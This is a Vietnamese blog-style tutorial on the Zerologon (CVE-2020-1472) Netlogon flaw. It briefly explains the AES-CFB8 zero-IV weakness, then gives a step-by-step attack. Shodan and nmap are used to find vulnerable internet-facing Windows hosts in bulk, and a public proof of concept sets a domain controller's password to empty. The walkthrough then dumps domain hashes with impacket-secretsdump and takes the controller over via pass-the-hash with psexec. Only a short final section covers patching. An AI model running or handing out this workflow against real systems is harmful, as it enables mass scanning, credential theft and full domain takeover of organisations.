![](https://images.viblo.asia/215c4f0e-bc68-4cfc-bade-9eb934de566a.png)

## I. Tìm hiểu Zerologon

Zerologon (CVE-2020-1472) là một lỗ hổng nghiêm trọng ảnh hưởng đến  Windows Server - Active Directory. Trong một số trường hợp nhất định, lỗ hổng này có thể cho phép kẻ tấn công bỏ qua xác thực sau đó giành được đặc quyền cấp quản trị viên chỉ trong vài giây - đạt 10 điểm trên thang điểm CVSS

**1. Netlogon Remote Protocol (MS-NRPC)**

Khi người dùng kết nối với Domain Controller , một tiến trình có tên gọi là **Netlogon Remote Protocol** giúp xác định và xác thực users - client trước khi họ được cấp quyền truy cập vào network. Mục đích của quá trình này giúp DC xác định, xác thực và tạo thuận lợi cho hàng nghìn người dùng đăng nhập vào máy chủ .

Netlogon chứa một tính năng cho phép quản trị viên hệ thống thay đổi mật khẩu cho những người dùng quên thông tin đăng nhập của họ. 

[![Screenshot_1.png](https://0xbadcode.ml/uploads/images/gallery/2022-02/scaled-1680-/Screenshot_1.png)](https://0xbadcode.ml/uploads/images/gallery/2022-02/Screenshot_1.png)

**2. ZeroLogon (CVE-2020-1472)**

Zerologon là một lỗ hổng trong giao thức mã hóa của dịch vụ Netlogon.Lỗ hổng cho phép kẻ tấn công tự nhận mình là quản trị viên Domain Controller sau đó thay đổi mật khẩu của chính mình. 

Điểm cốt lõi của lỗ hổng nằm ở việc triển khai không tốt hàm **ComputeNetlogonCredential** của NetLogon. 
ComputeNetlogonCredential nhận challenge bao gồm 8-bytes đầu vào và mã hóa nó sau đó xuất ra kết quả 8-bytes. Vấn đề nằm ở một lỗ hổng được triển khai trong phương thức AES-CFB8 được áp dụng trong việc chuyển đổi này.

Để sử dung AES-CFB8 một cách an toàn, một "random initialization vector (IV)" phải được tạo ngẫu nhiên cho từng challenge riêng biệt. **Tuy nhiên hàm ComputeNetlogonCredential đặt IV thành một giá trị cố định là 16  bytes 0**. Điều này dẫn tới một lỗ hổng mật mã, trong đó việc mã hóa 8 zero bytes có thể mang lại bản mã hóa gồm các số 0 với xác suất 1 trên 256 (Do lỗi triển khai này xảy ra đối với 1 trong 256 keys)

>Tervoort figured out that because of this implementation error for 1 in 256 keys, applying AES-CFB8 
>encryption to an all-zero plaintext will result in all-zero ciphertext

[![qAYScreenshot_1.png](https://0xbadcode.ml/uploads/images/gallery/2022-02/scaled-1680-/qAYScreenshot_1.png)](https://0xbadcode.ml/uploads/images/gallery/2022-02/qAYScreenshot_1.png)


[![AES-CFB8-encryption.png](https://0xbadcode.ml/uploads/images/gallery/2022-02/scaled-1680-/AES-CFB8-encryption.png)](https://0xbadcode.ml/uploads/images/gallery/2022-02/AES-CFB8-encryption.png)


[![NetrServer.jpg](https://0xbadcode.ml/uploads/images/gallery/2022-02/scaled-1680-/NetrServer.jpg)](https://0xbadcode.ml/uploads/images/gallery/2022-02/NetrServer.jpg)

**Các giai đoạn khai thác ZeroLogon**

**1. Gửi Zero byte** : Thay vì gửi 8 byte ngẫu nhiên. Hacker sẽ gửi 8 bye 0. Việc này lặp đi lặp lại cho đến khi máy chủ chấp nhận một trong số chúng và bỏ qua quá trình xác thực.
Trong trường hợp của ZeroLogon, cần trung bình 256 lần thử gửi để kết nối thành công tới máy chủ

**2. Disabling the RPC signing and sealing mechanism** 

MS-NRPC sử dụng RPC signing và Sealing mechanism để mã hóa cơ chế truyền tải. Thông thường đây là quy trình bắt buộc để truyền dữ liệu, nhưng trong MS-NRPC không bắt buộc và được quản lý bởi client. Điều này có nghĩa là bạn có thể tắt quy trình mã hóa thông qua message header. Do đó  kẻ tấn công có thể tùy ý sử dụng các phương thức trong giao thức MS-NRPC.

**3. Thay đổi mật khẩu tài khoản**

Giai đoạn thứ 3 của việc khai thác lỗ hổng ZeroLogon là thay đổi mật khẩu cho tài khoản của DC bằng tính năng NetrServerPasswordSet trong MS-NRPC. Hacker có thể xóa mật khẩu hiện tại (đặt mật khẩu rỗng) hoặc thay bằng mật khẩu ưa thích.


## II. Khai thác

**Tìm kiếm kết quả trên internet**

**Bước 1**. Cấu hình Shodan cho công việc recon
```
shodan init [API_KEY]
```


**Bước 2**. Sử dụng Shodan để tìm kiếm các mục tiêu chạy hệ điều hành Windows
```
shodan search --limit 1000 --fields ip_str "port:445 smb" | tee > ip.list
```
>--limit 1000 : Giới hạn 1000 kết quả đầu tiên

>--field ip_str: Chỉ lấy IP

> port:445 smb : Query search <Port 445 chỉ mang tính tương đối để xác định hệ điều hành Windows>

**Bước 3**. Sử dụng nmap để scan ip.list
```
nmap -p 135,137,139,445 --script smb-os-discovery -oA zero_logon -iL ip.list
```

[![CbtScreenshot_2.png](https://0xbadcode.ml/uploads/images/gallery/2022-02/scaled-1680-/CbtScreenshot_2.png)](https://0xbadcode.ml/uploads/images/gallery/2022-02/CbtScreenshot_2.png)

**Bước 4**. Covert kết quả nmap thu được từ (.xml) sang (.csv)
```
$ git clone https://github.com/zer010bs/zeroscan
$ cd zeroscan
$ python convert-nmap-zerologon.py /home/kali/zero_logon.xml
```

![](https://images.viblo.asia/527e0629-1239-412c-ac95-c3e24ab35969.png)


**Bước 5**. Do kết quả thu được bao gồm **WORKGROUP** và **Active Directory**. Tiến hành lọc kết quả và convert sang định dạng .csv
```
python convert-nmap-zerologon.py /home/kali/zero_logon.xml | grep "yes" | awk -F "|" '{print $1"," $4}' > zero_exploit.csv
```
![](https://images.viblo.asia/2d95075f-4da3-4fff-9cf9-5a6bed13b62a.png)


**Bước 6**. Kiểm tra lỗ hổng ZeroLogon trong danh sách
```
python zerologon_tester-mod.py zero_exploit.csv
```

![](https://images.viblo.asia/63314fa3-a1d9-421d-a016-22fbef75d8ba.png)


**Khai thác trên Lab Demo**

>Trước khi tiến hành demo, mình đã báo cáo cho quản trị viên nắm được, lỗ hổng sau đó đã được khắc phục

**Bước 7**. Khai thác

Sử dụng POC của Risksense, set password về trạng thái rỗng 
* **Set empty password**

```
$ git clone https://github.com/risksense/zerologon
$ cd zerologon
$ python set_empty_pw.py VOLS ip_bi_anh_huong
[python set_empty_pw.py DC_NAME IP]
```
![](https://images.viblo.asia/4d3c8431-2dde-45bc-adfa-46e14f837bf5.png)

Thành công!, ta tiến hành dump hash-password với impacket-ticket

* **Dump Hash Password**
```
impacket-secretsdump -just-dc veltech/VOLS\$@ip_bi_anh_huong
```

![](https://images.viblo.asia/569ae03a-46bf-4a11-8079-c72b9abe7408.png)


Sử dụng hash đã dump được, tiến hành cuộc tấn công Pass-The-Hash

* **Pass the Hash**
```
impacket-psexec -hashes aad3b435b51404eeaad335b51404ee:782efc6e0bbff4bd67266a37cca7bf Administrator@ip_bi_anh_huong
```

![](https://images.viblo.asia/f4fc73c8-d117-412c-af5e-d6ba03569144.png)

Chiếm quyền điều khiển DC thành công  !

## III. Cách khắc phục

Zerologon là một lỗ hổng không quá khó để hiểu, cũng như dễ dàng để tấn công. Tuy nhiên việc khắc phục nó cũng rất đơn giản, chúng ta chỉ cần update lại hệ thống - mọi thứ sẽ an toàn (bản PATCH https://msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472)

Tham khảo : https://www.csoonline.com/article/3576289/what-admins-need-to-know-about-microsofts-zerologon-vulnerability-fix.html